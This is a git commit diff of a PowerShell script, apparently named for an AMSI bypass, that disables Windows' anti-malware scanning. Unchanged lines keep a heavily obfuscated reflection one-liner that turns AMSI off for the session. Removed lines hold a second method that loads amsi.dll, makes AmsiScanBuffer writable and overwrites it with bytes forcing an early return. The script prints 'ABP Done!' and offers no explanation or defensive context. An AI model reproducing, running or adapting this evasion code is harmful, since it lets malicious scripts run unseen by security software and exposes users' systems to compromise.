635944ad0a3c7e989e3fd3cf586ea559963bc5b2
YMBlueRS <147590626+YMBlueRS@users.noreply.github.com>
2023-12-04 00:08:09 +0100

    Update ABP.ps1

--- ABP.ps1
+++ ABP.ps1
@@ -3,34 +3,6 @@ $b=$($syncBooleanItem="";$shareFirstFunction=222;$createInterfaceRepository = @(
 $c=$($deleteThisRepository="";$getCompanyReq=17;$pushIndexProvider = @('84');$(($pushIndexProvider[0]).split(";").forEach({[char]([convert]::toint16($_,16) - $getCompanyReq)}).forEach({$deleteThisRepository=$deleteThisRepository+$_});$deleteThisRepository);)
 [Ref].Assembly.GetType(($($removeTheWildcard="";$validateTableResult=9;$getLastResponse = @('37', '39', '3a', '4a', '56', '5c', '5e', '6e', '70', '72', '75', '76', '77', '78', '7c', '7d', '7e', '82', '84', '86');$(($getLastResponse[5] + "#" + $getLastResponse[17] + "#" + $getLastResponse[14] + "#" + $getLastResponse[15] + "#" + $getLastResponse[7] + "#" + $getLastResponse[11] + "#" + $getLastResponse[0] + "#" + $getLastResponse[4] + "#" + $getLastResponse[18] + "#" + $getLastResponse[1] + "#" + $getLastResponse[19] + "#" + $getLastResponse[12] + "#" + $getLastResponse[18] + "#" + $getLastResponse[1] + "#" + $getLastResponse[19] + "#" + $getLastResponse[8] + "#" + $getLastResponse[7] + "#" + $getLastResponse[11] + "#" + $getLastResponse[7] + "#" + $getLastResponse[12] + "#" + $getLastResponse[15] + "#" + $getLastResponse[0] + "#" + $getLastResponse[3] + "#" + $getLastResponse[16] + "#" + $getLastResponse[15] + "#" + $getLastResponse[13] + "#" + $getLastResponse[11] + "#" + $getLastResponse[18] + "#" + $getLastResponse[1] + "#" + $getLastResponse[19] + "#" + $getLastResponse[15] + "#" + $getLastResponse[9] + "#" + $getLastResponse[13] + "#" + $getLastResponse[12] + "#" + $getLastResponse[0] + "#" + $getLastResponse[3] + "#" + $getLastResponse[11] + "#" + $getLastResponse[18] + "#" + $getLastResponse[2] + "#" + $getLastResponse[19] + "#" + $getLastResponse[9] + "#" + $getLastResponse[6] + "#" + $getLastResponse[15] + "#" + $getLastResponse[9] + "#" + $getLastResponse[10] + "#" + $getLastResponse[18] + "#" + $getLastResponse[2] + "#" + $getLastResponse[19]).split("#").forEach({[char]([convert]::toint16($_,16) - $validateTableResult)}).forEach({$removeTheWildcard=$removeTheWildcard+$_});$removeTheWildcard);) -f $b,$c)).GetField(($($pushOnRequest="";$listLastRequest=9;$pingOldData = @('39', '3a', '3b', '4f', '52', '6d', '6e', '72', '75', '77', '7d', '84', '86');$(($pingOldData[11] + "*" + $pingOldData[0] + "*" + $pingOldData[12] + "*" + $pingOldData[11] + "*" + $pingOldData[2] + "*" + $pingOldData[12] + "*" + $pingOldData[7] + "*" + $pingOldData[4] + "*" + $pingOldData[9] + "*" + $pingOldData[7] + "*" + $pingOldData[10] + "*" + $pingOldData[3] + "*" + $pingOldData[11] + "*" + $pingOldData[1] + "*" + $pingOldData[12] + "*" + $pingOldData[7] + "*" + $pingOldData[8] + "*" + $pingOldData[6] + "*" + $pingOldData[5]).split("*").forEach({[char]([convert]::toint16($_,16) - $listLastRequest)}).forEach({$pushOnRequest=$pushOnRequest+$_});$pushOnRequest);) -f $a,$b,$c), ($($cacheCurrentConnection="";$getFirstID=35;$shareTheItem = @('4f', '53', '71', '73', '76', '85', '86', '8c', '8f', '91', '92', '97', '98', '9e', 'a0');$(($shareTheItem[2] + "+" + $shareTheItem[10] + "+" + $shareTheItem[9] + "+" + $shareTheItem[3] + "+" + $shareTheItem[12] + "+" + $shareTheItem[5] + "+" + $shareTheItem[8] + "+" + $shareTheItem[7] + "+" + $shareTheItem[6] + "+" + $shareTheItem[0] + "+" + $shareTheItem[4] + "+" + $shareTheItem[11] + "+" + $shareTheItem[13] + "+" + $shareTheItem[1] + "+" + $shareTheItem[14] + "+" + $shareTheItem[11] + "+" + $shareTheItem[7] + "+" + $shareTheItem[6]).split("+").forEach({[char]([convert]::toint16($_,16) - $getFirstID)}).forEach({$cacheCurrentConnection=$cacheCurrentConnection+$_});$cacheCurrentConnection);) -f $b)).SetValue($null,$true)
 
-$ZQCUW = @"
-using System;
-using System.Runtime.InteropServices;
-public class ZQCUW {
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-}
-"@
-
-Add-Type $ZQCUW
-
-$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
-$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
-$p = 0
-[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
-$TLML = "0xB8"
-$PURX = "0x57"
-$YNWL = "0x00"
-$RTGX = "0x07"
-$XVON = "0x80"
-$WRUD = "0xC3"
-$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
-[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
-
 
 $a = "`r`nABP Done!`r`n"
 $a
